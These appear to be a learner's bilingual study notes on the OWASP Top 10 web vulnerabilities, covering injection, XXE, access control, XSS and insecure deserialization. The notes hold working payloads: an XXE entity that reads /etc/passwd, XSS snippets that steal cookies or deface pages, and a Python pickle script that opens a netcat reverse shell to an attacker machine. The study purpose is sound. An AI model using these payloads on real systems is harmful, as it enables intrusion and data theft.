- Top 10 rủi ro bảo mật web
### Injection
##### SQL Injection
##### Command Injection
##### Main defend
- **Using an allow list:** when input is sent to the server, this input is compared to a list of safe input or characters. If the input is marked as safe, then it is processed. Otherwise, it is rejected and the application throws an error.
- **Stripping input:** If the input contains dangerous characters, these characters are removed before they are processed.
### Broken Authentication
##### Brute force attacks
##### Use of weak credentials
##### Weak Session Cookies
##### Main defend
- **To avoid password guessing attacks**, ensure the application enforces a strong password policy. 
- **To avoid brute force attacks**, ensure that the application enforces an automatic lockout after a certain number of attempts. This would prevent an attacker from launching more brute force attacks.
- **Implement Multi Factor Authentication** - If a user has multiple methods of authentication, for example, using username and passwords and receiving a code on their mobile device, then it would be difficult for an attacker to get access to both credentials to get access to their account.
### Sensitive Data Exposure
- Phá hashed pwd: [CrackStation - Online Password Hash Cracking - MD5, SHA1, Linux, Rainbow Tables, etc.](https://crackstation.net/)
- Lợi dụng việc dev để file nhạy cảm (.db, .sqlite) ở /root, client có thể truy cập thông qua url (/public, /assets)
### XML External Entity (XXE)
- Được sử dụng khi ứng dụng cho phép load external entities từ XML => dùng external entities trong file xml gửi cho ứng dụng với mục đích là đọc file hệ thống
- Khi parser XML **cho phép load external entities**, thì đoạn này sẽ cố gắng **đọc nội dung tập tin hệ thống** và chèn nó vào XML đầu ra. Đây chính là cách tấn công **XXE (XML External Entity)**, thường dùng để:
	- **Đọc file nhạy cảm** (ví dụ `/etc/passwd`, `/root/.ssh/id_rsa`)
	- **Khai thác SSRF (Server-Side Request Forgery)** qua `SYSTEM 'http://...'`
	- **Tấn công từ chối dịch vụ (DoS)** nếu lặp đệ quy entity
- Xml minh họa
	- read ở đây là 1 external entity
	- SYSTEM `'file:///etc/passwd'`: liên kết tới  1 file hệ thống
	- &read: in nội dung tệp tin ra (đối với in-band)
```
<?xml version="1.0"?>   
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>   
<root>&read;</root>
```
##### in-band XXE attack
##### out-of-band XXE attacks (blind XXE)
### Broken Access Control
- Websites have pages that are protected from regular visitors, for example only the site's admin user should be able to access a page to manage other users. If a website visitor is able to access the protected page/pages that they are not authorized to view, the access controls are broken.
- Truy cập vào private endpoint mà ko cần quyền
##### IDOR (Insecure Direct Object Reference)
- là một lỗ hổng bảo mật thuộc nhóm **Broken Access Control**, xảy ra khi một ứng dụng cho phép người dùng truy cập **trực tiếp** đến đối tượng (dữ liệu, file, tài nguyên, v.v.) thông qua một định danh (ID), **mà không kiểm tra quyền truy cập**.
- Sử dụng id như là 1 path variable (me/info/{id}), mà ko set quyền truy cập cụ thể cho từng người dùng thì người dùng khác có thể truy cập vào thông tin của người khác = cách đổi id
### Security Misconfiguration
- Poorly configured permissions on cloud services, like S3 buckets
- Having unnecessary features enabled, like services, pages, accounts or privileges
- Default accounts with unchanged passwords
	- Tìm source code -> kiếm thử default password có trong đó
	- Thử các default username/pwd thông dụng
- Error messages that are overly detailed and allow an attacker to find out more about the system
- Not using [HTTP security headers](https://owasp.org/www-project-secure-headers/), or revealing too much detail in the Server: HTTP header
### Cross-site Scripting (XSS)
##### Stored XSS
- the most dangerous type of XSS. This is where a malicious string originates from the website’s database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.
- Lưu script hợp lệ vô trong db
##### Reflected XSS
- the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.
- truyền script qua các thanh tìm kiếm hay những cái tương tự (GET method) để server chạy những cái script đó bên phía mình
##### DOM-Based XSS
- It represents the page so that programs can change the document structure, style and content. A web page is a document and this document can be either displayed in the browser window or as the HTML source.
- Thay đổi ndung HTML
##### XSS Payloads and examples
- Popup's (<script>alert(“Hello World”)</script>) - Creates a Hello World message popup on a users browser.
- Writing HTML (document.write) - Override the website's HTML to add your own (essentially defacing the entire page).
- XSS Keylogger (http://www.xss-payloads.com/payloads/scripts/simplekeylogger.js.html) - You can log all keystrokes of a user, capturing their password and other sensitive information they type into the webpage.
- Port scanning (http://www.xss-payloads.com/payloads/scripts/portscanapi.js.html) - A mini local port scanner (more information on this is covered in the TryHackMe XSS room).
- Tools:
	- [Cross-Site Scripting (XSS) Cheat Sheet - 2025 Edition | Web Security Academy](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
	- [FindXSS - Your Ultimate XSS Payload & Cheat Sheet Directory](https://findxss.com/)
	- [payloadbox/xss-payload-list: 🎯 Cross Site Scripting ( XSS ) Vulnerability Payload List](https://github.com/payloadbox/xss-payload-list)
- <script>alert(document.cookie)</script>
- <script>alert(window.location.host)</script>
- <script>document.querySelector("span#thm-title").innerText="I am a hacker"</script>
### Insecure Deserialization
- insecure deserialization is replacing data processed by an application with malicious code; allowing anything from DoS (Denial of Service) to RCE (Remote Code Execution) that the attacker can use to gain a foothold in a pentesting scenario
- Mở listener (atacker) chờ bên victim chay lện reverse shell
	- `nc -lvnp 4444`
- Sử dụng kỹ thuật reverse shell thông qua việc ứng dụng không xác thực base64 input
```
import pickle
import sys
import base64

command = 'rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | netcat YOUR_MACHINE_ID 4444 > /tmp/f'

class rce(object):
    def __reduce__(self):
        import os
        return (os.system,(command,))

print(base64.b64encode(pickle.dumps(rce())))
```
-  